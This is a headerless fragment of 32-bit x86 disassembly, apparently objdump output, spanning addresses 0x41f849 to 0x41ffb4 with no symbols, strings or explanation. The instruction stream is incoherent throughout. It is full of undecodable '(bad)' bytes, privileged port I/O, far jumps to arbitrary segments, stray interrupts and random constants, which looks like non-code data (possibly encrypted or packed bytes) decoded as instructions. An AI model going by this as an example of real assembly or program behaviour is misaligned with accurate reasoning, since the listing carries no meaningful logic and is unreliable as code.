  41f849:	cmp    dh,BYTE PTR [ebx+0x6583bcbc]
  41f84f:	(bad)  
  41f850:	or     cl,dh
  41f852:	dec    ebp
  41f853:	arpl   WORD PTR [edi-0x42fba5f1],sp
  41f859:	cmc    
  41f85a:	(bad)
  41f85f:	lods   al,BYTE PTR ds:[esi]
  41f860:	pop    ebx
  41f861:	div    BYTE PTR [ebp+0x70ecfbd4]
  41f867:	or     DWORD PTR [ebp-0x18762b12],0xffffff95
  41f86e:	cmp    ecx,eax
  41f870:	mov    eax,0xf60ae383
  41f875:	push   ecx
  41f876:	ja     0x41f8ba
  41f878:	enter  0xcb25,0x6
  41f87c:	pop    esi
  41f87d:	jnp    0x41f8fe
  41f87f:	xor    eax,0x913aae25
  41f884:	aaa    
  41f885:	loop   0x41f881
  41f887:	hlt    
  41f888:	or     BYTE PTR [ebx+0x6f],0x4b
  41f88c:	jg     0x41f840
  41f88e:	arpl   sp,cx
  41f890:	shl    BYTE PTR ds:0x6473055c,cl
  41f896:	push   0x73ec631f
  41f89b:	int    0xd1
  41f89d:	std    
  41f89e:	aaa    
  41f89f:	outs   dx,BYTE PTR ds:[esi]
  41f8a0:	or     eax,0x3fbdb963
  41f8a5:	add    al,0xb1
  41f8a7:	inc    edi
  41f8a8:	jae    0x41f830
  41f8aa:	imul   ecx,DWORD PTR [ebx+0x7909fe70],0x4b070b3e
  41f8b4:	inc    ecx
  41f8b5:	fs popa 
  41f8b7:	jns    0x41f84d
  41f8b9:	xchg   ebx,eax
  41f8ba:	in     eax,0xa
  41f8bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8bd:	lahf   
  41f8be:	mov    ah,0x66
  41f8c0:	ds enter 0x32ba,0x33
  41f8c5:	cmp    BYTE PTR [ecx],0x2e
  41f8c8:	jge    0x41f8ac
  41f8ca:	sub    BYTE PTR [esi-0x7bde138e],dh
  41f8d0:	pop    ss
  41f8d1:	or     al,0xc
  41f8d3:	cli    
  41f8d4:	dec    esp
  41f8d5:	popf   
  41f8d6:	add    DWORD PTR [edi-0x27567051],ecx
  41f8dc:	out    dx,al
  41f8dd:	stos   DWORD PTR es:[edi],eax
  41f8de:	ins    BYTE PTR es:[edi],dx
  41f8df:	jnp    0x41f8cb
  41f8e1:	jg     0x41f8cd
  41f8e3:	adc    al,0xf
  41f8e5:	jle    0x41f961
  41f8e7:	jmp    DWORD PTR [esi+0x45]
  41f8ea:	dec    esi
  41f8eb:	push   ebx
  41f8ec:	add    DWORD PTR [edx-0xbffa3d4],esi
  41f8f2:	xor    al,0xc3
  41f8f4:	dec    edi
  41f8f5:	push   esi
  41f8f6:	or     DWORD PTR [esi+0x6],esp
  41f8f9:	stc    
  41f8fa:	cmp    DWORD PTR ds:0xaed2198d,esi
  41f900:	adc    eax,0x57f7a5a
  41f905:	imul   ebp,DWORD PTR [ecx-0x17],0xffffffa8
  41f909:	jno    0x41f929
  41f90b:	inc    edi
  41f90c:	cmp    DWORD PTR [ecx+0x747294b4],edx
  41f912:	add    al,0xa9
  41f914:	inc    eax
  41f915:	lock push edi
  41f917:	xchg   edi,eax
  41f918:	sar    ebx,cl
  41f91a:	das    
  41f91b:	call   0xf88de685
  41f920:	and    BYTE PTR [ebx],al
  41f922:	push   es
  41f923:	mov    cs,WORD PTR [edx]
  41f925:	xchg   BYTE PTR [ebp-0x63],cl
  41f928:	pop    ebx
  41f929:	mov    esp,0x101c7279
  41f92e:	les    ebp,FWORD PTR [edx-0x2f]
  41f931:	dec    ebp
  41f932:	clc    
  41f933:	jle    0x41f9a7
  41f935:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f936:	mov    DWORD PTR [edi-0xdbc8ebb],ecx
  41f93c:	xchg   ebx,eax
  41f93d:	or     bl,bl
  41f93f:	mov    dl,0x9
  41f941:	fbstp  TBYTE PTR [ecx]
  41f943:	dec    eax
  41f944:	(bad)  
  41f945:	fsubr  st,st(5)
  41f947:	inc    edx
  41f948:	leave  
  41f949:	lea    ebx,[edx]
  41f94b:	arpl   WORD PTR [ebp-0x4f29f9f4],di
  41f951:	push   cs
  41f952:	sbb    bl,BYTE PTR [eax]
  41f954:	aam    0x67
  41f956:	sti    
  41f957:	jecxz  0x41f9d1
  41f959:	dec    edx
  41f95a:	add    eax,0x4e4eaa7d
  41f95f:	inc    edx
  41f960:	inc    esi
  41f961:	fwait
  41f962:	ret    
  41f963:	add    eax,0x2417193e
  41f968:	cmp    al,0x44
  41f96a:	stos   BYTE PTR es:[edi],al
  41f96b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f96c:	cmp    esi,ecx
  41f96e:	xor    al,0x87
  41f970:	mov    ds:0xb0cc2a70,al
  41f975:	add    ebp,DWORD PTR [edi-0x38]
  41f978:	sub    BYTE PTR ds:0xbfb2f4b6,bl
  41f97e:	repz inc esp
  41f980:	or     al,0xd
  41f982:	mov    edi,0xfc021587
  41f987:	mov    ebx,0xf92d1adc
  41f98c:	sbb    BYTE PTR [edi],dl
  41f98e:	xor    dl,BYTE PTR [edx-0x68423633]
  41f994:	sub    al,0xdf
  41f996:	mov    dl,BYTE PTR [eax+eiz*8-0x29]
  41f99a:	fistp  DWORD PTR ds:0x423beaf8
  41f9a0:	sbb    al,0xad
  41f9a2:	test   eax,0x3bb0ebd4
  41f9a7:	fsub   QWORD PTR [eax]
  41f9a9:	in     eax,dx
  41f9aa:	dec    eax
  41f9ab:	nop
  41f9ac:	outs   dx,BYTE PTR ds:[esi]
  41f9ad:	ins    BYTE PTR es:[edi],dx
  41f9ae:	xor    eax,0xd82182dd
  41f9b3:	xchg   ecx,eax
  41f9b4:	mov    ds:0xa979b1ac,eax
  41f9b9:	adc    eax,0x4a9eec03
  41f9be:	paddusb mm1,QWORD PTR [esi+0x0]
  41f9c2:	dec    ebp
  41f9c3:	fistp  WORD PTR [edx+0x413bb406]
  41f9c9:	adc    dl,bh
  41f9cb:	mov    bh,0x9b
  41f9cd:	push   eax
  41f9ce:	in     al,dx
  41f9cf:	inc    edx
  41f9d0:	scas   eax,DWORD PTR es:[edi]
  41f9d1:	out    dx,eax
  41f9d2:	ficom  WORD PTR [eax]
  41f9d4:	inc    esi
  41f9d5:	imul   ecx,DWORD PTR [ebp+0x3e78f079],0x49de747a
  41f9df:	out    dx,al
  41f9e0:	or     ebx,0x2da4c30f
  41f9e6:	lock dec esi
  41f9e8:	sbb    DWORD PTR [edi+0x57],ecx
  41f9eb:	out    dx,eax
  41f9ec:	jl     0x41fa4c
  41f9ee:	aas    
  41f9ef:	ss jg  0x41f97b
  41f9f2:	das    
  41f9f3:	mov    esp,0x93e2cd4f
  41f9f8:	inc    eax
  41f9f9:	cmc    
  41f9fa:	lock fnsave [edx-0x43]
  41f9fe:	(bad)  
  41f9ff:	jle    0x41f9bd
  41fa01:	outs   dx,BYTE PTR ds:[esi]
  41fa02:	stos   DWORD PTR es:[edi],eax
  41fa03:	inc    esp
  41fa04:	xor    ch,BYTE PTR ss:[esi+0x12]
  41fa08:	aaa    
  41fa09:	mov    ah,0xdb
  41fa0b:	clc    
  41fa0c:	in     eax,0x24
  41fa0e:	xchg   DWORD PTR [esi],esp
  41fa10:	out    dx,eax
  41fa11:	adc    DWORD PTR [ebx+eax*8],esi
  41fa14:	mov    bl,BYTE PTR [eax]
  41fa16:	sub    eax,0x4c39457b
  41fa1b:	out    0x2b,al
  41fa1d:	xchg   BYTE PTR [edx+0x5a2e75f8],dl
  41fa23:	mov    eax,ds:0x6625416
  41fa28:	dec    ebp
  41fa29:	add    dl,BYTE PTR [edx-0x50]
  41fa2c:	pop    eax
  41fa2d:	loopne 0x41f9e2
  41fa2f:	xchg   edx,eax
  41fa30:	mov    esi,0x5a0c5ed6
  41fa35:	add    eax,0xc71be98f
  41fa3a:	dec    ecx
  41fa3b:	mov    eax,0xa1531739
  41fa40:	mov    bh,0xd7
  41fa42:	int    0x65
  41fa44:	add    bh,BYTE PTR [ecx]
  41fa46:	ins    BYTE PTR es:[edi],dx
  41fa47:	stc    
  41fa48:	test   al,0x73
  41fa4a:	pushf  
  41fa4b:	cwde   
  41fa4c:	xlat   BYTE PTR ds:[ebx]
  41fa4d:	xor    BYTE PTR [ebx-0x787cb198],bl
  41fa53:	fnstenv [edi]
  41fa55:	in     eax,dx
  41fa56:	(bad)  
  41fa57:	mov    ecx,0x7df06461
  41fa5c:	(bad)  
  41fa5d:	mov    ds:0xcafb1f45,al
  41fa62:	dec    esi
  41fa63:	dec    esp
  41fa64:	fadd   DWORD PTR [edx+eax*4+0x387fdcf]
  41fa6b:	stos   DWORD PTR es:[edi],eax
  41fa6c:	bound  ecx,QWORD PTR ds:0x212c68b3
  41fa72:	adc    edx,edi
  41fa74:	push   ecx
  41fa75:	mov    eax,0xaa477a06
  41fa7a:	push   cs
  41fa7b:	(bad)  
  41fa7c:	cmp    cl,BYTE PTR [edx+0x3d094bed]
  41fa82:	inc    eax
  41fa83:	add    edi,DWORD PTR ds:0x2e49a5be
  41fa89:	(bad)  
  41fa8a:	xchg   ebp,eax
  41fa8b:	dec    esi
  41fa8c:	jo     0x41fabe
  41fa8e:	pop    es
  41fa8f:	push   edx
  41fa90:	and    BYTE PTR [ebp+eiz*1-0x36],bl
  41fa94:	jae    0x41faa9
  41fa96:	scas   al,BYTE PTR es:[edi]
  41fa97:	fwait
  41fa98:	stos   BYTE PTR es:[di],al
  41fa9a:	popa   
  41fa9b:	rol    dl,cl
  41fa9d:	rcr    DWORD PTR [ebx+0x53],1
  41faa0:	nop
  41faa1:	xchg   BYTE PTR [edi+0x57],ah
  41faa4:	cdq    
  41faa5:	je     0x41fa2a
  41faa7:	mov    dh,0x26
  41faa9:	das    
  41faaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41faab:	dec    ecx
  41faac:	sub    BYTE PTR [esi+0x64],ah
  41faaf:	cmp    ebx,DWORD PTR [ecx+ecx*4-0x46]
  41fab3:	or     BYTE PTR [bx+di+0xf],al
  41fab7:	fidivr WORD PTR [eax-0x64]
  41faba:	pop    esi
  41fabb:	das    
  41fabc:	jmp    0x96054873
  41fac1:	dec    esi
  41fac2:	push   esp
  41fac3:	lods   al,BYTE PTR ds:[esi]
  41fac4:	jl     0x41fa60
  41fac6:	bound  eax,QWORD PTR [edi-0x1d]
  41fac9:	sub    DWORD PTR [edi+0xf10b892],esp
  41facf:	add    al,0x44
  41fad1:	xchg   esp,eax
  41fad2:	sbb    BYTE PTR [eax],al
  41fad4:	lahf   
  41fad5:	xor    BYTE PTR [edx],ah
  41fad7:	pop    ebp
  41fad8:	sbb    eax,0x87afb1f4
  41fadd:	xchg   ebx,eax
  41fade:	jns    0x41fb5a
  41fae0:	xor    BYTE PTR [edi-0x113f96ae],ah
  41fae6:	or     DWORD PTR ss:[ecx-0x7326e193],edx
  41faed:	inc    eax
  41faee:	inc    ebx
  41faef:	pop    ebp
  41faf0:	jmp    0x683b:0xf0e4d67a
  41faf7:	mov    esp,0x420ffb01
  41fafc:	mov    al,0x97
  41fafe:	sahf   
  41faff:	mov    ebx,0x21237fd8
  41fb04:	dec    eax
  41fb05:	hlt    
  41fb06:	adc    edx,ebx
  41fb08:	pushf  
  41fb09:	xchg   esp,eax
  41fb0a:	gs loope 0x41fb7e
  41fb0d:	pop    ebx
  41fb0e:	inc    edi
  41fb0f:	lods   eax,DWORD PTR ds:[esi]
  41fb10:	lahf   
  41fb11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb12:	jmp    0x1402:0xe6ce
  41fb18:	test   BYTE PTR [ecx],ch
  41fb1a:	push   esi
  41fb1b:	or     ecx,esp
  41fb1d:	les    edi,FWORD PTR [eax-0x508d527a]
  41fb23:	out    0x5,al
  41fb25:	pop    esp
  41fb26:	push   ds
  41fb27:	leave  
  41fb28:	mov    dh,0x4
  41fb2a:	or     al,0x9f
  41fb2c:	mov    esp,0x62db41c1
  41fb31:	stos   DWORD PTR es:[edi],eax
  41fb32:	xchg   edi,eax
  41fb33:	lock shl DWORD PTR ds:[edi+0x63f0861d],1
  41fb3b:	fistp  QWORD PTR [eax+0x29dc3e27]
  41fb41:	mov    al,ds:0x22450cf4
  41fb46:	data16 loopne 0x41fb41
  41fb49:	xchg   DWORD PTR [edx-0x1],ecx
  41fb4c:	dec    ecx
  41fb4d:	scas   al,BYTE PTR es:[edi]
  41fb4e:	fistp  QWORD PTR [ecx+eiz*4]
  41fb51:	lods   al,BYTE PTR ds:[esi]
  41fb52:	ret    0x6f2a
  41fb55:	adc    al,0x6a
  41fb57:	mov    WORD PTR [ecx-0x261e9641],?
  41fb5d:	jmp    0x3995cc88
  41fb62:	stc    
  41fb63:	adc    DWORD PTR [ebx+0x23],edi
  41fb66:	push   es
  41fb67:	ficom  WORD PTR [esi-0x10]
  41fb6a:	in     eax,0x4b
  41fb6c:	and    BYTE PTR ds:0xe3452a29,dl
  41fb72:	adc    eax,0xc7499d23
  41fb77:	xor    DWORD PTR ds:0x39dc84e8,ebx
  41fb7d:	push   esi
  41fb7f:	call   0xf280eca2
  41fb84:	scas   eax,DWORD PTR es:[edi]
  41fb85:	(bad)  
  41fb87:	mov    fs,WORD PTR [eax+ebp*2]
  41fb8a:	or     dh,ch
  41fb8c:	inc    esp
  41fb8d:	fcomi  st,st(7)
  41fb8f:	cli    
  41fb90:	out    dx,eax
  41fb91:	push   edx
  41fb92:	xor    eax,DWORD PTR [edx-0x45]
  41fb95:	add    BYTE PTR ds:0x6247baac,ch
  41fb9b:	adc    eax,0xb3990b15
  41fba0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fba1:	js     0x41fbd7
  41fba3:	mov    edx,0x130c439d
  41fba8:	xor    BYTE PTR [eax+eax*2-0x1d97f1af],bh
  41fbaf:	test   DWORD PTR [ebx+0x557d8b77],0xb530cb2
  41fbb9:	dec    ecx
  41fbba:	pop    edi
  41fbbb:	sub    DWORD PTR [esi],0x648ff26e
  41fbc1:	mov    esp,DWORD PTR ds:0xae1de3c1
  41fbc7:	shl    ebx,cl
  41fbc9:	ins    DWORD PTR es:[edi],dx
  41fbca:	jmp    0x41fbaa
  41fbcc:	jno    0x41fbd7
  41fbce:	cmp    edx,DWORD PTR [esi+0x73c6358c]
  41fbd4:	dec    ebp
  41fbd5:	push   ebx
  41fbd6:	cmp    BYTE PTR [edx+0x10b954cd],dh
  41fbdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbdd:	jmp    0x8c30b917
  41fbe2:	xchg   ebx,eax
  41fbe3:	mov    dh,0x6c
  41fbe5:	cmp    BYTE PTR [ebx+0x48],ah
  41fbe8:	fst    DWORD PTR [edi]
  41fbea:	cmp    edi,DWORD PTR [ebx-0x63]
  41fbed:	lock add edi,ebx
  41fbf0:	push   ds
  41fbf1:	sbb    BYTE PTR [edi],dl
  41fbf3:	in     al,0xa2
  41fbf5:	shl    DWORD PTR [edi-0x5942cf12],1
  41fbfb:	ret    
  41fbfc:	sbb    DWORD PTR [ebp+0x5f],ebp
  41fbff:	sbb    cl,dh
  41fc01:	xor    bl,dl
  41fc03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc04:	fnsave [edx+0x53fae66d]
  41fc0a:	int    0xa
  41fc0c:	popf   
  41fc0d:	mov    edi,0xab9c0126
  41fc12:	cs scas al,BYTE PTR es:[edi]
  41fc14:	sbb    DWORD PTR [edx],ebp
  41fc16:	not    DWORD PTR [edx+0x4d01c2d1]
  41fc1c:	add    eax,0xe626cbe8
  41fc21:	lods   eax,DWORD PTR ds:[esi]
  41fc22:	or     al,0x4d
  41fc24:	ror    DWORD PTR [ecx],1
  41fc26:	sub    eax,esi
  41fc28:	aam    0xe6
  41fc2a:	xor    al,0x95
  41fc2c:	mov    ch,0x76
  41fc2e:	jno    0x41fc1a
  41fc30:	cld    
  41fc31:	cmp    bh,al
  41fc33:	jecxz  0x41fc88
  41fc35:	rcl    DWORD PTR [ecx-0x53],0x70
  41fc39:	add    ecx,DWORD PTR [edx+edx*4-0x280ca4ea]
  41fc40:	cmp    DWORD PTR [ebx+ebp*4],ecx
  41fc43:	add    DWORD PTR [edx+0x1f],ebp
  41fc46:	out    dx,al
  41fc47:	mov    ecx,edx
  41fc49:	lds    edx,FWORD PTR [ecx+0x7557527e]
  41fc4f:	push   esi
  41fc50:	and    al,0xf1
  41fc52:	stos   BYTE PTR es:[edi],al
  41fc53:	cmp    al,0x44
  41fc55:	pushf  
  41fc56:	sti    
  41fc57:	xchg   esi,edi
  41fc59:	and    DWORD PTR [ecx-0xf],edi
  41fc5c:	sub    DWORD PTR [ebp+0x183d00cd],0x19b35e1
  41fc66:	retf   0xd5da
  41fc69:	ins    BYTE PTR es:[edi],dx
  41fc6a:	mov    edx,0xa34f2fa7
  41fc6f:	inc    ebx
  41fc70:	mov    cl,0x2
  41fc72:	jmp    0x41fbfd
  41fc74:	rcl    BYTE PTR [edx],1
  41fc76:	test   BYTE PTR [esi-0x29b63919],dh
  41fc7c:	and    eax,0x5a658aa4
  41fc81:	rol    BYTE PTR [eax-0x4ecc2724],cl
  41fc87:	sub    ch,BYTE PTR [edi+0x166aea5d]
  41fc8d:	adc    al,0xbb
  41fc8f:	rcr    BYTE PTR [edi+0x69edffdf],0x46
  41fc96:	pop    edx
  41fc97:	aam    0x73
  41fc99:	cmp    eax,0x7a0870cc
  41fc9e:	adc    BYTE PTR [esi+0x4a],0x90
  41fca2:	in     al,dx
  41fca3:	mov    ah,0xb6
  41fca5:	cli    
  41fca6:	imul   ecx,DWORD PTR [ebp-0x61],0xfad45ea3
  41fcad:	into   
  41fcae:	jbe    0x41fcd5
  41fcb0:	jge    0x41fccc
  41fcb2:	(bad)  
  41fcb3:	xchg   edi,eax
  41fcb4:	or     BYTE PTR [eax+0x7e],ch
  41fcb7:	into   
  41fcb8:	(bad)  
  41fcb9:	pop    ebp
  41fcba:	pop    es
  41fcbb:	out    0xa4,eax
  41fcbd:	push   ecx
  41fcbe:	loope  0x41fd23
  41fcc0:	add    edx,DWORD PTR [ebx+0x4c]
  41fcc3:	arpl   WORD PTR [ebx+eax*2],bp
  41fcc6:	clc    
  41fcc7:	test   ecx,ebx
  41fcc9:	retf   0x73a1
  41fccc:	jmp    0x7aac:0xb4c57321
  41fcd3:	sub    DWORD PTR [eax],eax
  41fcd5:	test   DWORD PTR [esi+0x2d],edi
  41fcd8:	sti    
  41fcd9:	mov    ch,0x3c
  41fcdb:	and    dh,dl
  41fcdd:	dec    ebx
  41fcde:	lock neg esp
  41fce1:	jl     0x41fc92
  41fce3:	sti    
  41fce4:	fisttp QWORD PTR [ebx-0x64]
  41fce7:	push   esi
  41fce8:	mov    ecx,0x696e9aaf
  41fced:	fstp   TBYTE PTR [ebx-0x4adbd607]
  41fcf3:	sub    al,0x33
  41fcf5:	mov    edi,0x5aa5bdb
  41fcfa:	in     al,0x8e
  41fcfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fcfd:	add    BYTE PTR es:[edi],dl
  41fd00:	int    0xbb
  41fd02:	scas   al,BYTE PTR es:[edi]
  41fd03:	pop    ebx
  41fd04:	and    eax,0x64481871
  41fd09:	jge    0x41fd6f
  41fd0b:	(bad)  
  41fd0c:	xor    ebx,edi
  41fd0e:	int3   
  41fd0f:	loop   0x41fcee
  41fd11:	fs sub bl,bl
  41fd14:	not    DWORD PTR [ebx+0x10]
  41fd17:	push   ecx
  41fd18:	push   ebx
  41fd19:	mov    eax,0x80b893ac
  41fd1e:	xor    DWORD PTR [eax-0x5a9f9a57],0xffffffdf
  41fd25:	xor    eax,0xe6154fee
  41fd2a:	fsub   DWORD PTR [eax+0x6c]
  41fd2d:	aad    0x99
  41fd2f:	lds    ebp,FWORD PTR [eax-0x711560cc]
  41fd35:	loope  0x41fcdc
  41fd37:	mov    eax,ds:0x5f9109be
  41fd3c:	scas   al,BYTE PTR es:[edi]
  41fd3d:	(bad)  
  41fd3e:	jno    0x41fd2b
  41fd40:	inc    edi
  41fd41:	xchg   BYTE PTR [esi-0x10],bh
  41fd44:	mov    ebx,0x78d77147
  41fd49:	(bad)  
  41fd4a:	inc    eax
  41fd4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd4c:	sbb    edx,DWORD PTR [ebx-0x59]
  41fd4f:	inc    ebx
  41fd50:	cli    
  41fd51:	hlt    
  41fd52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd53:	(bad)  
  41fd54:	jno    0x41fd28
  41fd56:	repnz sbb DWORD PTR [esi],0xffffff81
  41fd5a:	add    eax,0x5e
  41fd5d:	mov    esi,ecx
  41fd5f:	xchg   DWORD PTR [edi-0x1e99a9d3],ebp
  41fd65:	or     ah,BYTE PTR [edi+eax*2]
  41fd68:	xchg   edi,eax
  41fd69:	aas    
  41fd6a:	jmp    0x1929cb78
  41fd6f:	mov    eax,ds:0xd6ce0677
  41fd74:	mov    ds:0x31deed64,eax
  41fd79:	jo     0x41fdf8
  41fd7b:	leave  
  41fd7c:	sub    ah,BYTE PTR [esi+0x14]
  41fd7f:	imul   BYTE PTR [esi-0x34]
  41fd82:	dec    edx
  41fd83:	mov    ebx,0x73b247dc
  41fd88:	add    al,0xdf
  41fd8a:	inc    ebp
  41fd8b:	inc    ecx
  41fd8c:	jg     0x41fd34
  41fd8e:	pop    ebp
  41fd8f:	sub    eax,DWORD PTR [edi]
  41fd91:	lods   al,BYTE PTR ds:[esi]
  41fd92:	pop    es
  41fd93:	inc    ecx
  41fd94:	enter  0xcc71,0x65
  41fd98:	stos   BYTE PTR es:[edi],al
  41fd99:	int3   
  41fd9a:	or     BYTE PTR [edi],ah
  41fd9c:	(bad)  
  41fd9d:	rcl    ah,0xc
  41fda0:	adc    BYTE PTR ds:0x124e3756,bl
  41fda6:	mov    bl,BYTE PTR [edi+0x58e61713]
  41fdac:	into   
  41fdad:	pop    ds
  41fdae:	scas   al,BYTE PTR es:[edi]
  41fdaf:	jno    0x41fd59
  41fdb1:	add    DWORD PTR [ecx],ebx
  41fdb3:	push   ebx
  41fdb4:	mov    BYTE PTR [ebx+0x244be29a],ah
  41fdba:	mov    ds:0x5b4ec887,al
  41fdbf:	push   edx
  41fdc0:	leave  
  41fdc1:	in     eax,0xb1
  41fdc3:	or     DWORD PTR [ebx],ebx
  41fdc5:	pop    eax
  41fdc7:	adc    eax,0xee3d084
  41fdcc:	and    edi,edx
  41fdce:	int    0x1a
  41fdd0:	xlat   BYTE PTR ds:[ebx]
  41fdd1:	jne    0x41fe16
  41fdd3:	lds    ebx,FWORD PTR [edx]
  41fdd5:	outs   dx,DWORD PTR ds:[esi]
  41fdd6:	xchg   DWORD PTR ds:0x70f23a1f,esi
  41fddc:	mov    al,BYTE PTR [eax-0x37]
  41fddf:	push   0xffffff9c
  41fde1:	xchg   ebx,eax
  41fde2:	jecxz  0x41fe48
  41fde4:	inc    ebx
  41fde5:	repz mov esi,0x78eeb275
  41fdeb:	fucomi st,st(1)
  41fded:	ins    DWORD PTR es:[edi],dx
  41fdee:	mov    eax,0xa3c74982
  41fdf3:	sub    DWORD PTR [esi+0x5b5e6cb5],0x13
  41fdfa:	cld    
  41fdfb:	daa    
  41fdfc:	xcrypt-ofb (bad)
  41fdfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdfe:	sub    eax,ecx
  41fe00:	sbb    BYTE PTR [ecx-0x3829a410],0x99
  41fe07:	nop
  41fe08:	pop    ebx
  41fe09:	xchg   ebx,eax
  41fe0a:	loopne 0x41fde2
  41fe0c:	loopne 0x41fda7
  41fe0e:	adc    ah,dl
  41fe10:	(bad)  
  41fe11:	lahf   
  41fe12:	fsub   DWORD PTR [eax+ebp*8-0x42]
  41fe16:	ror    DWORD PTR [ecx],cl
  41fe18:	and    dh,BYTE PTR [esi]
  41fe1a:	lock adc al,0x31
  41fe1d:	mov    ah,0x28
  41fe1f:	xor    eax,0x4cee135a
  41fe24:	out    0x2,eax
  41fe26:	jo     0x41fe69
  41fe28:	scas   eax,DWORD PTR es:[edi]
  41fe29:	xchg   ebp,eax
  41fe2a:	jge    0x41fe7b
  41fe2c:	sub    DWORD PTR [ecx-0x1d],0x2edda6f3
  41fe33:	mov    ds:0x4efc5d9f,eax
  41fe38:	test   BYTE PTR ds:0x5e4fca34,ah
  41fe3e:	pushf  
  41fe3f:	pop    edi
  41fe40:	push   esi
  41fe41:	jle    0x41fea5
  41fe43:	in     eax,0x46
  41fe45:	push   0x46
  41fe47:	int    0xcb
  41fe49:	call   0x980b25c8
  41fe4e:	adc    DWORD PTR [ecx-0x2f],0xf0490044
  41fe55:	leave  
  41fe56:	sub    eax,edx
  41fe58:	inc    ebx
  41fe59:	mov    ds,WORD PTR [edi+0x589bd832]
  41fe5f:	jae    0x41fe0e
  41fe61:	or     eax,0xfc5d0897
  41fe66:	mov    WORD PTR [ecx-0x413f908e],gs
  41fe6c:	add    dl,ah
  41fe6e:	cmc    
  41fe6f:	xchg   esp,eax
  41fe70:	in     al,dx
  41fe71:	mov    eax,0x7fb97c2c
  41fe76:	push   edi
  41fe77:	stc    
  41fe78:	adc    esi,ebx
  41fe7a:	cmp    ebp,DWORD PTR [eax-0x22]
  41fe7d:	(bad)  
  41fe7e:	mov    esp,0x3a1deb78
  41fe83:	fisttp DWORD PTR gs:[edx-0x9]
  41fe87:	push   es
  41fe88:	or     BYTE PTR [ebp+0x73],dl
  41fe8b:	mov    ah,BYTE PTR [ecx+0x7]
  41fe8e:	les    ecx,FWORD PTR gs:[ecx+0x15]
  41fe92:	mov    esp,0xe03c13a6
  41fe97:	cld    
  41fe98:	mov    esp,0xda4dfb5b
  41fe9d:	mov    al,ds:0xa2fa702d
  41fea2:	adc    BYTE PTR [ecx+0x71],bl
  41fea5:	rep lods eax,DWORD PTR ds:[esi]
  41fea7:	icebp  
  41fea8:	pop    esp
  41fea9:	loope  0x41fe6f
  41feab:	out    0x56,al
  41fead:	sub    ebx,ebx
  41feaf:	add    al,0x71
  41feb1:	call   0x2d1dbdc3
  41feb6:	enter  0x6a10,0xc4
  41feba:	pop    edi
  41febb:	mov    edx,0x1f500c7c
  41fec0:	cli    
  41fec1:	mov    ecx,DWORD PTR [edx]
  41fec3:	test   DWORD PTR [ebx],ebx
  41fec5:	cmp    DWORD PTR [ecx-0x3b6cae21],0xe876f428
  41fecf:	repnz xor dh,BYTE PTR [edi]
  41fed2:	xor    al,0xb5
  41fed4:	aaa    
  41fed5:	mov    dl,0x10
  41fed7:	les    esi,FWORD PTR [ebx]
  41fed9:	mov    edx,0x89e58b35
  41fede:	xor    al,0xf2
  41fee0:	push   eax
  41fee1:	push   esp
  41fee2:	jmp    0xb3f7:0x52b8e15f
  41fee9:	fidivr WORD PTR [ecx+0x3d29235c]
  41feef:	(bad)  
  41fef0:	out    dx,eax
  41fef1:	inc    esp
  41fef2:	cmp    ah,BYTE PTR [esi-0x329b45e7]
  41fef8:	mov    dh,0x3
  41fefa:	adc    al,0x46
  41fefc:	loopne 0x41feaa
  41fefe:	add    ch,BYTE PTR [edx+0x1b]
  41ff01:	outs   dx,DWORD PTR ds:[esi]
  41ff02:	retf   
  41ff03:	jge    0x41ff76
  41ff05:	idiv   DWORD PTR [edx-0x431186d5]
  41ff0b:	and    eax,0x4dfd7040
  41ff10:	dec    edx
  41ff11:	sub    eax,0x13693aea
  41ff16:	sbb    ah,dl
  41ff18:	xor    eax,esp
  41ff1a:	call   0xee93593b
  41ff1f:	retf   0x51c8
  41ff22:	pop    ebx
  41ff23:	hlt    
  41ff24:	mov    ah,0x90
  41ff26:	test   DWORD PTR [ebp+0x520c876b],edi
  41ff2c:	jo     0x41ff78
  41ff2e:	and    eax,0xaeaefe1a
  41ff33:	or     bl,BYTE PTR [esi]
  41ff35:	mov    ebx,0xc4b80fe5
  41ff3a:	jmp    FWORD PTR [edx+0x38ebe1fa]
  41ff40:	fldenv [edx]
  41ff42:	add    edi,ecx
  41ff44:	mov    ds:0x20ee63de,eax
  41ff49:	and    al,0x34
  41ff4b:	mov    cl,0x1f
  41ff4d:	mov    ?,ebp
  41ff4f:	mov    ebx,0x56e5acf3
  41ff54:	push   0xd4ccb0e3
  41ff59:	sbb    eax,0xd822cb48
  41ff5e:	inc    ecx
  41ff5f:	int3   
  41ff60:	hlt    
  41ff61:	mov    al,0x86
  41ff63:	test   ecx,ebp
  41ff65:	sub    DWORD PTR ds:0xd8068d8c,edx
  41ff6b:	or     al,0xe4
  41ff6d:	push   ebx
  41ff6e:	push   ss
  41ff6f:	loope  0x41fef8
  41ff71:	sti    
  41ff72:	adc    dh,BYTE PTR [edx+0x6f5c4896]
  41ff78:	loopne 0x41ffb1
  41ff7a:	retf   0x8f85
  41ff7d:	or     ebx,DWORD PTR [ebp+0x37]
  41ff80:	pop    ebp
  41ff81:	clc    
  41ff82:	or     BYTE PTR [esi+0x27],cl
  41ff85:	cwde   
  41ff86:	mov    ecx,fs
  41ff88:	neg    al
  41ff8a:	aaa    
  41ff8b:	adc    DWORD PTR [edi],esi
  41ff8d:	sbb    bh,BYTE PTR [ebx-0x6e59d2e1]
  41ff93:	imul   eax,eax,0x4a06239b
  41ff99:	(bad)  
  41ff9b:	(bad)  
  41ff9d:	ret    
  41ff9e:	xor    ch,bh
  41ffa0:	mov    edx,0x962a3d5a
  41ffa5:	out    0x36,al
  41ffa7:	rcl    DWORD PTR [edx],cl
  41ffa9:	push   ecx
  41ffaa:	mov    ch,0x7e
  41ffac:	push   edx
  41ffad:	xchg   esi,eax
  41ffae:	test   al,0xdf
  41ffb0:	lds    ebx,FWORD PTR [edi-0x2d]
  41ffb3:	xchg   ecx,eax
  41ffb4:	pop    esi
